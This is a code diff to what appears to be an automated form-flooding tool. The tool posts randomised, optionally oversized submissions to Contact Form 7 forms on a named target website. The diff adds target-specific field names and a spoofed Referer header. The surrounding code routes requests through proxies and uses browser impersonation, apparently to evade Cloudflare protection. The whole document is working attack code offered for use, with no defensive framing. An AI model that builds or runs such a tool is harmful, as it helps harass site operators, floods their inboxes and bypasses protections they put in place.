@@ -111,6 +111,8 @@ TARGETS = {
         "form_id":  "248",
         "unit_tag": "wpcf7-f248-p850-o1",
         "threshold": 25,
+        "cf_referer": "https://metoo-buffalo.com/?customize_messenger_channel=preview-2",
+        "fields": {"name": "text-7", "email": "email-532", "subject": "text-8", "message": "textarea-585"},
     },
 }
 
@@ -495,21 +497,23 @@ def build_files(form_id, unit_tag):
 
 MSG_REPEAT = 1
 
-def build_multipart(form_id, unit_tag, large_payload=False):
+def build_multipart(form_id, unit_tag, large_payload=False, fields=None):
     """curl_cffi needs CurlMime, not the requests-style files dict."""
     f = random_payload_fields()
     msg = f["message"]
     if MSG_REPEAT > 1:
         msg = ("\n\n---\n\n".join([msg] * MSG_REPEAT))
+    fm = fields or {"name": "your-name", "email": "your-email",
+                    "subject": "your-subject", "message": "your-message"}
     mp = CurlMime()
     mp.addpart(name="_wpcf7", data=form_id)
     mp.addpart(name="_wpcf7_version", data="6.1.6")
     mp.addpart(name="_wpcf7_locale", data="en_US")
     mp.addpart(name="_wpcf7_unit_tag", data=unit_tag)
-    mp.addpart(name="your-name", data=f["name"])
-    mp.addpart(name="your-email", data=f["email"])
-    mp.addpart(name="your-subject", data=f["subject"])
-    mp.addpart(name="your-message", data=msg)
+    mp.addpart(name=fm["name"], data=f["name"])
+    mp.addpart(name=fm["email"], data=f["email"])
+    mp.addpart(name=fm["subject"], data=f["subject"])
+    mp.addpart(name=fm["message"], data=msg)
     if large_payload:
         extra_keys = random.sample(_EXTRA_FIELD_KEYS, k=random.randint(8, 14))
         for key in extra_keys:
@@ -581,9 +585,14 @@ def send_one(req_num, cfg, pool):
                 timeout=25,
             )
         else:
+            cf_referer = cfg.get("cf_referer")
+            if cf_referer:
+                hdrs = {**hdrs, "Referer": cf_referer}
             r = cf_requests.post(
                 cfg["url"],
-                multipart=build_multipart(cfg["form_id"], cfg["unit_tag"], large_payload=LARGE_PAYLOAD),
+                multipart=build_multipart(cfg["form_id"], cfg["unit_tag"],
+                                          large_payload=LARGE_PAYLOAD,
+                                          fields=cfg.get("fields")),
                 headers=hdrs,
                 proxies=px,
                 impersonate=impersonate,
